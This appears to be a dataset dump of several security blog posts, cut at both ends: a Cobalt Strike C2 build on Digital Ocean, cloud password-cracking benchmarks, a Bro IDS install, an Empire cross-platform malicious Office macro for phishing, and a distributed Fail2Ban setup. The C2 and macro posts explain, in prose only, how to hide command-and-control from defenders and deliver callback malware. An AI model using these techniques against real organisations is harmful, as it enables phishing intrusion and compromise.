we\u2019ve also found helpful:-John\u2019s classic \u201cInfosec Basics & Fundamentals\u201d https://www.blackhillsinfosec.com/?p=4663-Derek talks about some general ideas \u201cDeveloping Hacking Kung Fu (or How To Get Into Information Security)\u201d  http://www.blackhillsinfosec.com/?p=4655\n\nHere\u2019s a whole list of other starting in infosec blog posts: https://room362.com/start/\n\nIf watching videos is more your style, our website has a wealth of webcasts and conference talks we\u2019ve done. Watch them. And sign up for our webcasts.\n\nHere\u2019s the gist of what John says when we overhear him talk to people: \u201cLearn to code in Python, use Linux somewhere, play with sed and awk.\u201d \n\nThere are BSides conferences everywhere! These are smaller, intimate places to hear and meet like-minded infosec people. If you have time, volunteer. You will feel like a n00b, everyone does. After a few times attending, submit a talk, and then submit another talk. \n\nYou also might start a Twitter account and engage with it. Twitter is one of those things where it remains what you make it. If you\u2019re building it expressly to learn more about infosec, keep it focused, don\u2019t rabbit hole down your other interests. Follow people in the security industry and pay attention to what\u2019s going on. This is the best and cheapest way to build your own threat intelligence feed. (2) Find someone you like and look at their lists, that\u2019s a great way to start to know who\u2019s who and what\u2019s happening in infosec. Check out Ethan Robish\u2019s list.\n\nWe live in an age when people can actually be involved and be doing the things they say they want to do in their careers. You want to be in infosec? Don\u2019t wait for someone to hire you, or make your dreams come true for you - start building them yourself.\n\nKeep us posted and good luck in all your future endeavors!\n\nWith Love,\n\nBlack Hills Information Security\n\n____\n\nWe saw this tweet as we were writing this response, couldn't agree more! https://twitter.com/highmeh/status/887553361737691136 Thanks, @highmeh\n\nYes! @0daySimpson\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Build a C2 Infrastructure with Digital Ocean - Part 1\"\nTaxonomies: \"How-To, Blue Team, blue teaming, C2, C2 Infrastructure, Digital Ocean, Let's Encrypt, pen-testing, penetration testing, Red Team, red teaming, SSH configuration\"\nCreation Date: \"Mon, 24 Jul 2017 13:21:52 +0000\"\nLee Kagan* //\n\nDeploying an offensive infrastructure for red teams and penetration tests can be repetitive and complicated. One of my roles on our team is to build-out and maintain the red team systems and control accesses to and from them. There\u2019s an endless variety of what you may wish to deploy but I found I was consistently repeating the same baseline deployment.\n\nIn the cat and mouse game of red vs. blue there are challenges for both sides with regards to successfully launching an offensive and successfully defending against one.\n\nFor red teams, and as our team infrastructure handler, the following items are my concerns:\n\nStability\n\nThe general system performance and reliable communications channels and accesses \n\nSecurity\n\nOPSEC and defenses against investigators / blue teams \n\nFunctionality\n\nAdd/remove/modify features and capabilities as the team requires \n\nThe Red Team Infrastructure wiki is a great example and resource of this exact concept. You can read more at https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki\n\nHere I\u2019ll cover using Digital Ocean with Cobalt Strike team servers in a semi-automated fashion that is the beginning of a more complex and automated process and tooling I hope to release shortly in part 2. For now, this should serve as a good starting place.\n\nWhat we\u2019re going build:\n\n3 Digital Ocean droplets\n\nfor the different roles, our team servers play Cobalt Strike \n\nCustomize the SSH configuration\n\nServer health monitoring\n\nFirewall access to and from the team servers\n\nLet\u2019s Encrypt for HTTPS beacons\n\nHere are the things you\u2019ll need in advance:\n\nCobalt Strike license or trial version\n\nCan replace this with MSF or Empire etc. \n\nDigital Ocean account\n\nC2K Files https://github.com/invokethreatguy/C2K\n\nDNS configuration access for your domain(s)\n\nWill need to set DNS A records\n\nThe infrastructure we are going to set up will do the following (mostly scripted):\n\nDeploy our droplets via Digital Ocean web UI\n\nSSH into each and add new sudo user, add SSH keys and transfer the C2K files\n\nRestrict SSH access to the new user with keys only\n\nRun the C2K builder script which will:\n\nUpdate the system   \n\nInstall lterm for console logging\n\nMuch thanks to KillswitchGUI for this tool https://github.com/killswitch-GUI   \n\nInstall Java dependencies for Cobalt Strike   \n\nActivate Cobalt Strike   \n\nReplace current SSH config with custom file   \n\nCreate firewall rules   \n\nRun HTTPsC2DoneRight.sh\n\nMuch thanks to KillswitchGUI for this tool https://github.com/killswitch-GUI \n\nLet\u2019s begin!\n\nThe Steps\n\nLog in to your Digital Ocean control panel. As you can see I have no droplets yet so let us go through the steps.\n\nWe\u2019re going to create three droplets. The settings that I\u2019m using are Ubuntu 14.04 for the OS and the $40 per month pricing. I don\u2019t recommend going lower than this if you expect your Cobalt Strike team servers to do some heavy lifting. (screen2)\n\nI\u2019m selecting the Toronto region because that\u2019s where I am, but feel free to choose your location. From an OPSEC perspective, it is not only advised to spread out your team servers in different geographical locations but depending on the defensive level you require, perhaps even different VPS providers (in case blue team blocks the entire Digital Ocean range, it could happen).\n\nIn the above image, I\u2019ve also selected \u201cMonitoring\u201d which we\u2019ll come back to and I\u2019ve attached an SSH key that I\u2019ve added to my Digital Ocean account.\n\nFinally, create the three droplets as seen below. I\u2019ve named my droplets \u201ccnc1\u201d, \u201ccnc2\u201d, and \u201ccnc3\u201d. Going forward I will be demonstrating the rest of our deployment on \u201ccnc1\u201d for the sake of time but the process will be identical to the others.\n\nThe droplets should take a short moment to be created. Once they are live, SSH in using the root account and the SSH key you\u2019ve added when we constructed the droplets.\n\nI'll pause here for a moment and mention a fairly new feature to the Digital Ocean control panel (although what I am about to show you is built into the provided script, this is just to point out a cool feature achieving the same result).\n\nFirewalls!\n\nClick on Networking from the control panel and select Firewalls.\n\nClick \u201cCreate Firewall\u201d and you should be presented with a configuration menu that has one current inbound rule, SSH. What I\u2019ll demonstrate in the images below is creating the same rules that we will use in the script.\n\nIn the above image, I\u2019ve created the following inbound rules:\n\nHTTP and HTTPS for our HTTP/S beacons\n\nDNS UDP and TCP for DNS beacons and evil DNS things you may need\n\nCobalt Strike team server port (50050)\n\nOur custom SSH port (7654)\n\nSave the rules and then apply them to your droplets. You can either select droplets by name or by tag and add the firewall rules to all of them. Very convenient!\n\nOkay, let\u2019s get back to the droplets. I\u2019ve logged in via SSH and now we\u2019re going to do some manual configuration. In the image below, I\u2019m adding a password for the root account, adding a new user called \u201cdemouser\u201d who will be added to the sudoers group and will be our main account for everything.\n\nWhile still logged in as root, edit the SSHD configuration file:\n\n~# nano /etc/ssh/sshd_config\n\nQuick side note, in the C2K folder, there\u2019s a pre-made SSHD config that has the exact same modifications as I\u2019m describing below. In the builder script we\u2019ll use later, you can optionally comment out or delete this part of the script.\n\nLets\u2019 change the following to:\n\nPort 7654\n\nPermitRootLogin no\n\nPasswordAuthentication yes (bear with me)\n\nAt the very bottom add the following:\n\nAllowUsers demouser\n\nExit the SSH session as root and transfer your SSH public key to the demouser account:\n\n~# ssh-copy-id demouser@\n\nNow you should be able to log in with keys only. SSH in as the demouser and edit the SSHD config file again and change the PasswordAuthentication setting to no.\n\nYou\u2019ll need to transfer the files.zip to your team server somehow (SCP, wget from github) which you can find here: https://github.com/invokethreatguy/C2K\n\nYou\u2019ll also need to provide you own Cobalt Strike trial and place it into the unzipped files.zip folder once you get to that point (mine is already bundled in as you\u2019ll see later).\n\nWith everything unpacked in your users home folder (that\u2019s my preference) you are ready to run the installer script.\n\nBefore you do, if you wish to follow along with me exactly then move everything (the unpacked files.zip contents and cobaltstrike-trial.tgz) into your home folder. For example, wherever you unpacked everything you could do this by:\n\n~# mv files/* ~\n\nNow let\u2019s run the installer script C2Ubuntu.sh and take a look at what this script will do:\n\nThe first part will ask you if you're ready to proceed. There\u2019s no clever input handling here so type \u201cyes\u201d.\n\nThe script will then install lterm which is a fantastic terminal logging utility by @Killswitch-GUI and can be found here: https://github.com/killswitch-GUI/lterm\n\nNext, it will prepare the dependencies for Cobalt Strike and prompt you for your license key\n\nThe script will then copy over the custom SSHD configuration file it ships with but this is entirely optional to your preferences. Simply comment this out if you do not wish for this to happen. The firewall rules I demonstrated in the control panel will be set and saved across reboots then the SSH service will be restarted.\n\nWhen the script completes it will execute the HTTPsC2DoneRight.sh script also courtesy of @Killswitch_GUI and can be found here separately:\n\nhttps://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh\n\nI highly recommend you ensure the DNS A records for you team server you wish to enable HTTPS on is already configured as the Let\u2019s Encrypt process will need to verify it as being live.\n\nIf all went well, you should see the following image near the end of the output:\n\nThis script will automatically pull the Amazon Malleable C2 profile and add the correct entries into its configuration to allow the certificate to be used.\n\nHere is the Amazon.profile file and certificate added to its configuration:\n\nNow we can verify if all is working correctly by visiting our servers address over SSL and you should be presented with the default Apache welcome page.\n\nBefore you start Cobalt Strike, be sure to stop the apache2 service otherwise your listeners will bark at you:\n\n~# sudo service apache2 stop\n\nNow connect to your Cobalt Strike team server and load the amazon profile:\n\n~# ./teamserver httpsProfile/amazon.profile\n\nStand up an HTTPS listener, deliver to you target and if all is well:\n\nYour C2 should be ready to go!\n\nBefore we wrap up, I wanted to touch on the droplet monitoring we enabled in the beginning. C2 performance monitoring is somewhat under appreciated and if you\u2019re expecting a lot of traffic, this is a great way to keep an eye on things.\n\nBack in the Digital Ocean control panel, select Monitoring and create an alert policy.\n\nI\u2019ve just the default settings for a CPU performance monitor. The cool part is you can automatically receive emails and connect the alerts into a Slack channel.\n\nAny new performance alerts will be sent your specified Slack channel.\n\nConclusion\n\nThis script is in its early phase and I hope to develop a framework with some killer automation features. For now, feel free to change settings as you like or need and feedback is always welcome.\n\nIn part 2 of this series, we\u2019ll move forward in adding additional features into our script and deployment such as:\n\nAutomate everything in this post\n\nUse the Digital Ocean cloud_config feature\n\nAdd more monitoring to the droplets for defensive and OPSEC purposes\n\ni.e. logwatch, AIDE, \n\nExpand the C2 to include redirectors for each C2 team server\n\nThank you very much to BHIS for having me contribute to this awesome blog. You all rock!\n\n____________\n\n*Lee Kagan is a guest blogger from RedBlack Security. He is an offensive security professional with almost a decade in IT and InfoSec. A penetration tester, red teamer and currently lead for RedBlack Security\u2019s Rogue Team specializing in threat and adversary emulation in Toronto, Canada. Lee\u2019s focus on the team and in practice is offensive infrastructure support, post-exploitation of Windows and Active Directory environments, PowerShell and C# weaponization.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Crack Passwords in the Cloud with GPU Acceleration (Kali 2017)\"\nTaxonomies: \"Red Team, Red Team Tools, Amazon, cloud, Cloud Cracking, GPU Acceleration, Kali 2017, Kali GPU, Kali Linux, Password cracking\"\nCreation Date: \"Tue, 01 Aug 2017 15:06:36 +0000\"\nCarrie Roberts* //\n\nHow does password cracking in the cloud compare to down here on earth? Maybe not as heavenly as imagined. I saw this on the web and got excited:\n\n\u201cYou can get up and running with a Kali GPU instance in less than 30 seconds. All you need to do is choose a P2 instance, and you\u2019re ready to start cracking!\u201d https://www.kali.org/news/cloud-cracking-with-cuda-gpu/\n\nIt\u2019s true (mostly!) The first time you attempt to launch the instance you will find that, by default, you are not allowed to launch the P2 Kali instances on Amazon as shown in the error message below.\n\nThe message contains the following text with a link to request more instances.\n\nYou have requested more instances (1) than your current instance limit of 0 allows for the specified instance type. Please visit http://aws.amazon.com/contact-us/ec2-request to request an adjustment to this limit.\n\nI submitted the form and was easily approved within a day.\n\nUse this link to find and launch your desired instance: https://aws.amazon.com/marketplace/pp/B01M26MMTT\n\nThe image below shows the process of launching a single GPU cloud instance.\n\nSo let\u2019s do some cracking speed comparisons using Hashcat\u2019s benchmarking option. The table below summarizes the results with supporting images at the end of this post. The \u201con earth\u201d system is the one detailed in this blog post: https://www.blackhillsinfosec.com/?p=5995\n\nNote that I did get a CUDA compatibility message from the cloud crackers saying that performance was degraded but I did not find a workaround for that issue. If you know of one, please let me know and I will update this post.\n\nThe conclusion I came to is that the 16 GPU cloud instance at $15/hr would be an OK solution for a quick password crack at a CTF event, for example, but that hourly price adds up to over ten thousand dollars a month!!! I recommend biting the bullet and building your own password cracker here on earth before you burn up all your money in the cloud.\n\n CPU Cracking in the Cloud \n\n GPU Cracking on Earth \n\n GPU Cracking in Cloud (1 GPU) \n\n GPU Cracking in the Cloud (16 GPU\u2019s) \n\n_____\n\n*Carrie Roberts no longer works with us (*sob) but we are proud to have her brilliant guest posts!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Monitor Network Traffic with Virtualized Bro 2.51 on Ubuntu 16.04.2 on ESXi 6.5\"\nTaxonomies: \"Author, Blue Team, Blue Team Tools, Kent Ickler, bro, Bro 2.51, Bro Install, ESXi, ESXi 6.5, Kent Ickler, Network monitoring, network traffic, Ubuntu, Ubuntu 16.04.2\"\nCreation Date: \"Thu, 03 Aug 2017 14:00:49 +0000\"\nKent Ickler // \n\nYou\u2019ve heard us before talk about Bro, an IDS for network monitoring and analysis.  We\u2019ve had several installs of Bro over time here at BHIS.  It's about time for another build, and I thought it would be a good time to share an example methodology.  This post is going to be two parts:  Configuring ESXi for a Bro install, and configuring said Bro install.  It's worth noting that there are pros and cons to operating Bro in a virtualized environment.  It's not for everyone.\n\nFor us, among other things, it allows us to utilize a single tap into an ESXi host that can run multiple IDS applications.  By using vswitch in promiscuous mode, we are able to duplicate monitor traffic to multiple guest VMs (Bro, Snort, ect, ect).\n\nHere's a diagram of things:\n\nHardware:Running Bro on VMware increases the required resources a bit.  Additionally, you need hardware that can support running a virtualized environment. Budget network cards are usually not a good mix at this point.  At the very least, be sure that your hardware has two Network Interface cards, one of which can be entered into monitor/ mode.  \n\nESXI Install:Not really a big deal here, I\u2019ll make an assumption you know how to get up and running.  If you don\u2019t, let us know and I\u2019ll make another blog post.\n\nNetwork Pre-Reqs for BroIt will be necessary to send two interfaces to the ESXi server.\n\nESXi Management interface\n\nNetwork Mirror/Tap\n\nThe network management interface can include other VLAN\u2019s as you see fit, but you will need to be sure you can access both the ESXi Server and its guest from its configured VLAN.  \n\nThe Network Mirror/Tap can be produced from either switch configuration to produce data mirrored from another port, or from a traditional network tap.  Blog about mirror/tap methods is possible in the future!  We use both dedicated-hardware and switch configurations in our office as we have multiple points of traffic to monitor.  For your first Bro install, you will typically want to be mirror your WAN data-- that is, a mirror of data between your internet connection and your router.\n\nESXI pre-req\u2019s for BroESXi will need to be configured so that you can access its management GUI from the first network interface.  This can be configured with VLANS if necessary.  The second interface will need to be put into monitor mode so that the ESXi OS does not filter (ignore packets for MAC addresses it doesn\u2019t harbor) data coming into the interface (which it typically would if it had no reason to receive such traffic).\n\nNetwork configuration in ESXI:In our case, our server has 3 NICs.NIC0: UnusedNIC1: MirrorNIC2: Management\n\nLogin to the ESXi Web Gui, Click on Networking -> Physical NICs\n\nConfirm your NICs are present.  Determine which NICs will be used for the Mirror traffic.\n\nCreate the virtual switch that will receive Mirror data.Click on Networking -> Virtual Switches -> Add standard virtual switch\n\nEnter a name for the vSwitch: \u201cMirrorSwitch\u201dUplink 1: Select the NIC that will receive the mirror traffic.Link Discover: NONESecurity: Promiscuous mode: Accept\n\nSetup Mirror Port group to receive dataClick on Networking -> Port Groups -> Add Port Group\n\nConfigureName: MirrorGroupVirtualSwitch: MirrorSwitchPromiscuous mode: Accept\n\nCreate your new VM:Ensure that your VM has two NICs added.\n\n LAN NIC (VM Network)\n\nMirror Group\n\nInstall Ubuntu 16.04Nothing specific here, move on when you\u2019re logging at console.  As usual, be sure first to apt-get update and apt-get upgrade.  Oh, and for most of the configuration you will need to be sudo/root-- might as well sudo -s.\n\nPrepare Ubuntu for Bro\n\nConfigure network stack:nano /etc/network/interfacesMove your management interface to a static IP address (good idea).  In our case, the management interface is ens192 and the mirror-data interface is ens160.  I can check the interface names with a simple \u201cip addr\u201d (use sudo).\n\nConfigure Mirror NICLet's move the mirror-data NIC into promiscuous mode, bring it up, and check for data\u2026\n\nEnable and \u201cup\u201d the mirror interface:$ ip link set ens160 promisc on$ ip link set ens160 up\n\nMake that NIC enabled on boot:nano /etc/rc.local (add before \u201cexit 0\u201d) ip link set ens160 promisc on ip link set ens160 up\n\nGive it a whirl (ctrl+c to exit)tcpdump -i ens160   (ens160 is our mirror NIC, you can add -vv to check protocol processing)You\u2019ll see some data flowing if your tap is already set up and sending data in.\n\nGeneral Bro Install:We will be generally following the Official Bro 2.5.1 install documentation, available at Bro\u2019s website. https://www.bro.org/sphinx/install/install.html.  We\u2019re following the guide pretty close except for changing the default install location to /opt/bro instead of /usr/local/bro.\n\nGet the pre-requisites:sudo apt-get install cmake make gcc g++ flex bison libpcap-dev libssl-dev python-dev swig zlib1g-dev libgeoip-dev build-essential\n\nInstall PFRingPFRing is a module that changes how packets received from the NIC are processed by the components that send data to Bro.  You can build a Bro installation without it, but it helps greatly in reducing packet loss from the mirror.  More information on PFRing can be found here: http://www.ntop.org/products/packet-capture/pf_ring/\n\ncd /optgit clone https://github.com/ntop/PF_RING.gitcd PF_RING/kernelmakesudo insmod ./pf_ring.kocd ../userlandmake\n\ncd PF_RING-6.2.0/userland/lib./configure --prefix=/opt/PF_RINGmake install\n\ncd ../libpcap./configure --prefix=/opt/PF_RINGmake install\n\ncd ../tcpdump-4.1.1./configure --prefix=/opt/PF_RINGmake install\n\ncd ../../kernelmakemake install\n\nMake pf_ring module load at boot:nano /etc/modulesAdd \u201cpf_ring\u201d\n\nBro, its Time! Git the Bro code, Brogit clone --recursive git://git.bro.org/bro\n\nDo the thingsCompile, noting that we are adding the optional PFRing module we compiled above and changing the default install location.\n\ncd configure./configure --with-pcap=/opt/PF_RING --prefix=/opt/bro/ (--prefix change install location)makemake install\n\nDoing things (this\u2019ll take awhile):\n\nConfigure the runtime $PATHexport PATH=/opt/bro/bin:$PATH\n\nMake that change permanent toonano ~/.profile (add the above to the path)\n\nConfigure your Bro!nano /opt/bro/etc/node.cfg\n\nWe have a couple of changes to make to the config file to tell Bro to use the PFRing module and to listen on the appropriate NIC.  Settings will be simpler if you choose not to use PFRing.  \n\nComment out the entire [bro] section by putting a hash # in front of each line.Then uncomment the sections for [manager] , [proxy-1] and [worker-1].In [worker-1] change the interface to match your mirror interface and add lb_method=pf_ring as well as lb_procs=5.\n\nTest!\\opt\\bro\\bin\\broctlAt the BroControl promptinstall (only need to do this once)deploystatusexit (don\u2019t worry, bro is still running)\n\nNext time, you can use just \u201cdeploy\u201d instead of \u201cinstall\u201d.  The image below shows \u201cdeploy\u201d being used after an initial \u201cinstall\u201d had already been completed.  Missed that screenshot; meow!\n\nCheck the logs!tail -f /opt/bro/logs/current/conn.log    (CTRL+C to exit this)\n\nAuto-StartNow, let\u2019s make it start on boot!nano /etc/rc.localAdd: /opt/bro/bin/broctl start\n\nMaintenanceAdd maintenance functions to keep Bro happy:crontab -e (select your editor if necessary, then enter the following line at the bottom)*/5 * * * * /opt/bro/bin/broctl cron\n\nReboot and make sure all is well.Reboot -h nowLogin, and test your bro logs to ensure data is flowing!A few minutes after you have restarted, check your conn.log file to ensure you see trafficTail -f /opt/bro/logs/current/conn.logIf you don\u2019t see updates here, or the file is missing, try to redeploy the bro instance now that the system is fully loaded./opt/bro/bin/broctl deploy\n\nWord of caution:Because we compiled PFRing in this kernel, any kernel builds may cause the PFRing module to fail to load.  You will need to recompile PFRing if you update your kernel after compiling.\n\nFin!Future Bro blogs likely!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How To: Empire's Cross Platform Office Macro\"\nTaxonomies: \"Author, David Fletcher, Phishing, Red Team, Empire, Macro, macro malware, OSX, PowerShell, Windows\"\nCreation Date: \"Mon, 07 Aug 2017 13:57:07 +0000\"\nDavid Fletcher //\n\nDuring our testing, we encounter organizations of various different sizes, shapes, and composition.  One that we\u2019ve run across a number of times includes a fairly even mixture of Microsoft Windows and Apple OSX operating systems. Under normal circumstances it can be difficult to identify which users are using Windows and which are using OSX.  This can make phishing with malware challenging.  If the wrong payload is delivered to the wrong operating system...no shell.\n\nAs a solution, we can just include some intelligence in our macro malware to decide whether to execute a PowerShell or Python payload based on the target operating system.  Fortunately, with the integration of the PowerShell Empire and EmPyre projects into PowerShell Empire 2.0, we have ready-made stagers to accomplish this goal.\n\nThe stager listing from PowerShell Empire 2.0 can be seen below with the macro payloads for Windows and OSX both highlighted.\n\nBefore we can generate our stagers, we have to get a listener up and running.  For this demonstration, we\u2019ll just use the default configuration with the listener name \u201cxplatform_macro\u201d. However, I would encourage you to modify the default communication profile to deviate from the standard requests, include jitter, and use a valid TLS certificate.  This will decrease the chances of your malware communication getting stopped by a proxy or detected by anti-malware tools looking for beaconing behavior.\n\nWith the listener configured, just issue the \u201cexecute\u201d command to launch it.\n\nNext, we need to grab output from each of the two launchers.  Here we just need to set the listener name and issue the \u201cgenerate\u201d command.  The output from each instance should be copied into a text editor so we can manipulate them. Generation of the Windows and OSX macros can be seen below.\n\nWith the macro content at hand, we can now build our cross platform malicious macro document.\n\nFirst, open the Macro editor in Word (both the Windows and OSX versions will work for this). The Macro editor is accessed by enabling the Developer tab in the Office Ribbon and clicking the Macros button.\n\nNext, paste the declare statement that appears in the OSX macro as seen below.  Windows will safely ignore this statement because the \u201csystem\u201d function is never called by the PowerShell based macro.  Then create the necessary AutoOpen() subroutine and use the \u201cMac\u201d directive to to conditionally execute either the PowerShell or Python payload based on the detected operating system.  In this case, I named the resulting functions DebugMac and DebugWin as seen below.\n\nNext, the original macro subroutines are refactored into the target functions as seen below.  In the case of the Windows Macro, a Dim statement had to be added to explicitly declare the strComputer variable.  No other modifications were made (remember to end each function with \u201cEnd Function\u201d).\n\nWith the malicious macro document complete, the only thing left to do is to test on each of the targeted platforms.  After execution, we have two agents that have called back to our PowerShell Empire listener.  One running PowerShell and one running Python...both from the same document.\n\nThis technique has its limitations.  It only works with modern macro-enabled office documents.  Office for Mac did not support macros in the older format.  In addition, Office 2016 for Mac doesn\u2019t appear to allow access to the C library used to make the Python system call.\n\nGo pwn some mixed platform environments!!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Configure Distributed Fail2Ban: Actionable Threat Feed Intelligence\"\nTaxonomies: \"Author, Blue Team, Blue Team Tools, Kent Ickler, Defending, Defending Websites, Distributed Fail2Ban, Fail2Ban, IPtables, Kent Ickler, Pirates, Website Defense\"\nCreation Date: \"Thu, 10 Aug 2017 14:55:42 +0000\"\nKent Ickler //\n\nHow to Configure Distributed Fail2Ban: Actionable Threat Feed Intelligence\n\nFail2Ban is a system that monitors logs and triggers actions based on those logs. While actions can be very customized, the typical use case is monitoring an auth-log for authentication errors and configuring a system to block the offending source IP. \n\nFail2Ban works great deployed in this fashion. However, I wanted to take it a step further. With the below method, you can use Fail2Ban to block the offending source as usual, but then notify other Fail2Ban nodes that they should also block the offending source from future connections.  This is a base set of code you can build on to distribute your Fail2Ban bans across multiple Fail2Ban nodes.\n\nProof of Concept & Method\n\nThis is a proof-of-concept that you can build to scale laterally or vertically. This method uses SSHFS to remotely mount a file-share that can be read and appended by multiple systems concurrently. The configuration adds an action to write to a \u201cglobal\u201d ban log, where other Fail2Ban nodes monitor and process the bans. The newbans.log global log file is appended by a Fail2Ban action that calls a system component called \u201clogger\u201d which is used to generate a consistent-format entry in a system-log; and in our case the standard output. The logger standard-output is redirected to append to the global newbans.log (on the file-server)\n\nlogger -s -i \"HOST PORT \" 2>> /opt/logdistro/logs/newbans.log\n\nIn our configuration, we are using Fail2Ban to monitor SSH as its primary trip-wire source. While Fail2Ban will wait for three invalid SSHd attempts logged in the /var/log/auth.log file, it will only wait for the single entry in the newbans.log file. This is because the newbans.log log file only includes log entries that have already been banned by a cooperating Fail2Ban node and therefore it isn\u2019t necessary to wait for more entries. Increasing the \"maxretry\" for newbans.log could potentially allow rules like \u201cOnly global-ban if a source had three invalid SSH attempts on two different servers within 30 minutes\u201d.\n\nFail2Ban includes options to automatically un-ban sources after a given time. Each Fail2Ban node independently manages its own ban and unbanning processes. The Fail2Ban \u201cserver\u201d node, in this case, is just a storage location for the global newbans.log file. With this method, we use SSHFS to mount the log file across the network using SSH. Other methods exist, but this was quick, and secure method to \u201cshare\u201d the logfile. I cannot comment on the scalability of hundreds of nodes in this practice. Presumably, there is a limitation to the number of collaborating Fail2Ban nodes with SSHFS mounted files that this system could support before becoming inefficient.\n\nHeadaches and Tweaks\n\nSome tweaking may be necessary. Some distro\u2019s will process log polling differently and you may need to adjust the \u201cbackend\u201d variable accordingly. The \u201cPolling\u201d method worked for most of our nodes. On a few other Linux distros however, changes to the global newbans.log log went unnoticed. This was due to to the \u201cbackend\u201d method not acknowledging that the SSHFS mounted file had changed. More information on the \u201cbackend\u201d methods can be found on Fail2Bans website.\n\nWe are calling the same iptables-multiport action when banning a source found in newbans.log therefore the collaborating Fail2Ban nodes will also enter their own entry in newbans.log.  If a node creates a ban in response to another node\u2019s newbans.log entry the ban will use multiport to ban all ports, not just the initial connection port. This will cause the log to be bit noisy but allows each node to report back that it propagated the ban.  This can be configured in a multitude of ways.   Additionally, the action to add the entry in newbans.log can be applied to other Fail2Ban actions.\n\nGet on with it!\n\nThe configuration here is relatively simple. We first setup an SSH server where we will host a \u201cglobal\u201d newbans log file. We will create a user and a private/public keypair that will allow other Fail2Ban nodes to securely access and append the new log file. Then, moving to the Fail2Ban node we will take the private-key and setup the remote file-share mount using SSHFS and fstab. Lastly, we will need to setup the Fail2Ban configuration files to look at the new files and trigger things accordingly-- for that I\u2019ve provided a GitHub clone to get you moving quickly.\n\nSetup new server:\n\nIn this case, I chose a DigitalOcean droplet to be the storage location of the global log file. It doesn\u2019t have to be in the cloud however. Hosting the file on your local network could reduce delay if you do not configure log rotations for the newbans.log file. \n\nsudo -s\n\nmkdir /opt/logdistro\n\ntouch /opt/logdistro/newbans.log\n\nuseradd f2bcourrier\n\nchown -R /opt/logdistro\n\nsu f2bcourrier ##(operate as new f2bcourrier user)\n\ncd ~/\n\nssh-keygen -t rsa -b 4096 ### (you could use RSA too!)\n\ncat ~/.ssh/id_rsa.pub > ~/.ssh/authorized_keys\n\ncat ~/.ssh/id_rsa\n\n#Copy this output (Private-key), we\u2019ll need it soon\n\nexit\n\nSetup the Fail2Ban Node:\n\nPre-Req\u2019s\n\nsudo -s\n\napt-get install sshfs\n\napt-get install fail2ban\n\nmkdir /opt/logdistro\n\nmkdir /opt/logdistro/logs\n\nmkdir /opt/logdistro/keys\n\nnano /opt/logdistro/keys/f2bcourier.key \n\n#Paste the contents of your \u201cid_rsa\u201d from the server.\n\nNext, update /etc/fstab to mount the new log data:\n\nnano /etc/fstab\n\n ##--- Add line below; be sure to change SERVER IP, ect:\n\nf2bcourrier@[SERVER IP]:/opt/logdistro /opt/logdistro/logs fuse.sshfs auto,reconnect,allow_other,StrictHostKeyChecking=no,cache=no,IdentityFile=/opt/logdistro/keys/f2bcourier.rsa,defaults,_netdev 0 0'\n\nNext, let fstab mount the remote file location:\n\nmount -a\n\nIf you get any failures here, you\u2019ll need to umount /opt/logdistro/logs before trying again.\n\nTest it out! \n\ntouch /opt/logdistro/logs/test\n\nBack on the server, you now should see a file in /opt/logsdistro/!\n\nFail2Ban Configuration\n\nThe remainder of the node configuration will involve building and/or rebuild some configuration files. I have added these files and an ansible playbook template in a GitHub repo. A list of the files in the GitHub repo is below. Lastly, we need to either comment out the lines of the defaults-debian.conf file in /etc/fail2ban/jail.d or mv the file out of the Fail2Ban folders. Below we will move the file to the \u201cold\u201d folder in the GitHub clone.\n\niptables-multiport.conf\n\nFail2Ban Action file that includes information to write to the new \u201cglobal\u201d log file.\n\nReplaces /etc/fail2ban/actions.d/iptables-multiport.conf\nnewbans.conf \n\nFail2Ban Filter for the new \u201cglobal\u201d log file.\n\nMove to /etc/fail2ban/filter.d/newbans.conf \nSshd.conf (OPTIONAL) \n\nFail2Ban Updated filter for SSHD, includes some additional SSH failures for key-based-auth.\n\nReplaces /etc/fail2ban/filter.d/sshd.conf\nJail.local \n\nFail2Ban Jail configuration to create the new global-log monitor instance.\n\nMove to /etc/fail2ban/jail.local\nFail2ban-with-distro.yml (OPTIONAL) \n\nAnsible Playbook to remotely deploy a Fail2Ban Node with the global ban configured. If you use this playbook, be sure to update the [SERVER IP] on the /etc/fstab configuration and have your private-key available for transfer by ansible. This playbook includes all necessary processing to take a node without Fail2Ban installed to a Fail2Ban protected node cooperating with the newbans.log log file.\n\nDownload the files and move them into their respective locations:\n\ncd /opt\n\ngit clone https://github.com/Relkci/F2BDistro.git\n\ncp /opt/F2BDistro/f2bfiles/iptables-multiport.conf /etc/fail2ban/action.d/\n\ncp /opt/F2BDistro/f2bfiles/newbans.conf /etc/fail2ban/filter.d/newbans.conf\n\ncp /opt/F2BDistro/f2bfiles/sshd.conf /etc/fail2ban/filter.d/sshd.conf\n\ncp /opt/F2BDistro/f2bfiles/jail.local /etc/fail2ban/jail.local\n\nmkdir /opt/F2BDistro/old\n\nmv /etc/fail2ban/jail.d/defaults-debian.conf /opt/F2BDistro/old\n\nRestart Fail2Ban and check Logs\n\nservice Fail2Ban restart\n\nCheck the Fail2Ban log to ensure everything loaded properly:\n\ntail /var/log/fail2ban.log\n\nTest\n\nTest and watch. When three invalid authentication attempts are now made on SSH, the Fail2Ban node will locally block the source IP for 30 minutes. It will also add an entry in the newbans.log file for other Fail2Ban nodes to read. When they see the new entry in newbans.log, they will immediately block the source IP for the 30 minutes.\n\nYou can tail the Fail2Ban log file at /var/log/fail2ban.log and watch this happen real-time. There is a delay. In my test deployment of 10 servers, all nodes had blocked an offending IP within 3 seconds of the third authentication attempt on the initial node.\n\nTo manually trigger a distributed ban you can use the below line.\n\nlogger -s -i \"HOST PORT \" 2>> /opt/logdistro/logs/newbans.log\n\nBuild Wide\n\nI\u2019m not sure how busy your primary server will get, but you can expect it will retain one SSH connection per Fail2Ban node for the SSHFS remote log file. If the file begins to grow significantly large, it may require log rotation to reduce the traffic involved in monitoring the file.\n\nBuild Tall\n\nBecause the newbans.log log format is pretty simple, you can program any application to write to this log and have an IP blocked by all nodes. The initial block doesn\u2019t have to come from a Fail2Ban node.  Utilizing the logger syntax below, you can add newbans.log entries as needed.\n\nlogger -s -i \"HOST PORT \" 2>> 